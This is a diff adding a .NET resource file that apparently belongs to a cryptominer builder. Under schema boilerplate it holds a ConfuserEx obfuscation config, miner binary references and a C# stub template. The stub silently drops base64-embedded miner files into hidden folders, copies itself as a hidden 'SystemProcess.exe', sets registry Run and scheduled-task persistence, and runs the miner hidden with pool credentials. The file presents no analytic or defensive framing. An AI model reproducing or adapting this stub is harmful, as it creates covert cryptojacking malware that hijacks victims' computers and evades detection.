@@ -1,0 +1,272 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="ConfuserEx" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\ConfuserEx.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="libiconv_2" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\libiconv-2.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="Profile" xml:space="preserve">
+    <value>%pool%
+%user%
+%password%
+%startup%
+%threads%
+%algo%
+%obf%
+%silent%</value>
+  </data>
+  <data name="config" xml:space="preserve">
+    <value>&lt;project outputDir="%path%" baseDir="%path%" xmlns="http://confuser.codeplex.com"&gt;
+  &lt;rule pattern="true" preset="maximum" /&gt;
+  &lt;module path="%stub%"&gt;
+    &lt;rule pattern="true" preset="maximum" /&gt;
+  &lt;/module&gt;
+&lt;/project&gt;</value>
+  </data>
+  <data name="libidn_11" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\libidn-11.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="libintl_8" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\libintl-8.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="minerd" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\minerd.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="zlib1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\zlib1.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="stub" xml:space="preserve">
+    <value>using System.IO;
+using Microsoft.VisualBasic;
+using System.Reflection;
+using System.Threading;
+
+namespace System
+{
+    class Program
+    {
+        static string _InstallFolder = Path.GetTempPath() + "%random%\\";
+        static string _ExePath = _InstallFolder + "%random1%.exe";
+        static string libcurl = _InstallFolder + "libcurl-4.dll";
+        static string libiconv = _InstallFolder + "libiconv-2.dll";
+        static string libidn = _InstallFolder + "libidn-11.dll";
+        static string libintl = _InstallFolder + "libintl-8.dll";
+        static string libwinpthread = _InstallFolder + "libwinpthread-1.dll";
+        static string zlib1 = _InstallFolder + "zlib1.dll";
+
+        static string _ExePathB64 = "%exeb%";
+        static string libcurlB64 = "%libcurl%";
+        static string libiconvB64 = "%libiconv%";
+        static string libidnB64 = "%libidn%";
+        static string libintlB64 = "%libintl%";
+        static string libwinpthreadB64 = "%libwinpthread%";
+        static string zlib1B64 = "%zlib1%";
+
+        static string startupdir = Path.GetPathRoot(Assembly.GetEntryAssembly().Location) + "Users\\" + Environment.UserName + "\\AppData\\Local\\%random2%";
+
+        static void Main(string[] args)
+        {
+            Mutex mutex = null;
+
+            const string appName = "%mutex%";
+            bool createdNew;
+
+            mutex = new Mutex(true, appName, out createdNew);
+
+            if (!createdNew)
+            {
+
+                return;
+            }
+
+            %Startup();%
+            %Persistence();%
+            InstallMiner();
+            StartMiner("%pool%", "%user%", "%password%", "%algo%", %threads%);
+        }
+
+        static void StartMiner(string pool, string user, string password, string algo, int thread)
+        {
+            string CPU = " -o " + pool + " -u " + user + " -p " + password + " -a " + algo + " -t " + thread;
+            Interaction.Shell(_ExePath + CPU, AppWinStyle.%silentmode%, true);
+
+        }
+
+        static void Persistence()
+        {
+            Interaction.Shell("schtasks.exe /create /tn %random% /tr " + startupdir + "\\SystemProcess.exe /sc minute /mo 1", AppWinStyle.Hide);
+        }
+
+        static void Startup()
+        {
+            
+            if(!Directory.Exists(startupdir))
+            {
+                Directory.CreateDirectory(startupdir);
+                File.SetAttributes(startupdir, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Hidden);
+                File.Copy(Assembly.GetEntryAssembly().Location, startupdir + "\\SystemProcess.exe");
+                File.SetAttributes(startupdir + "\\SystemProcess.exe", FileAttributes.Hidden | FileAttributes.System | FileAttributes.Hidden);
+                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                key.SetValue("%random3%", startupdir + "\\SystemProcess.exe");
+            }
+        }
+
+        static void InstallMiner()
+        {
+            if (Directory.Exists(_InstallFolder))
+            {
+                Directory.Delete(_InstallFolder, true);
+            }
+
+            Directory.CreateDirectory(_InstallFolder);
+
+            File.WriteAllBytes(_ExePath, Convert.FromBase64String(_ExePathB64));
+            File.WriteAllBytes(libcurl, Convert.FromBase64String(libcurlB64));
+            File.WriteAllBytes(libiconv, Convert.FromBase64String(libiconvB64));
+            File.WriteAllBytes(libidn, Convert.FromBase64String(libidnB64));
+            File.WriteAllBytes(libintl, Convert.FromBase64String(libintlB64));
+            File.WriteAllBytes(libwinpthread, Convert.FromBase64String(libwinpthreadB64));
+            File.WriteAllBytes(zlib1, Convert.FromBase64String(zlib1B64));
+
+            File.SetAttributes(_InstallFolder, FileAttributes.Hidden | FileAttributes.System);
+            File.SetAttributes(_ExePath, FileAttributes.Hidden | FileAttributes.System);
+            File.SetAttributes(libcurl, FileAttributes.Hidden | FileAttributes.System);
+            File.SetAttributes(libiconv, FileAttributes.Hidden | FileAttributes.System);
+            File.SetAttributes(libidn, FileAttributes.Hidden | FileAttributes.System);
+            File.SetAttributes(libintl, FileAttributes.Hidden | FileAttributes.System);
+            File.SetAttributes(libwinpthread, FileAttributes.Hidden | FileAttributes.System);
+            File.SetAttributes(zlib1, FileAttributes.Hidden | FileAttributes.System);
+
+        }
+    }
+}</value>
+  </data>
+  <data name="libcurl_4" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\libcurl-4.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="libwinpthread_1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\libwinpthread-1.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="xCryptocurrency_logo_1845x580" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\xCryptocurrency_logo_1845x580.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+</root>
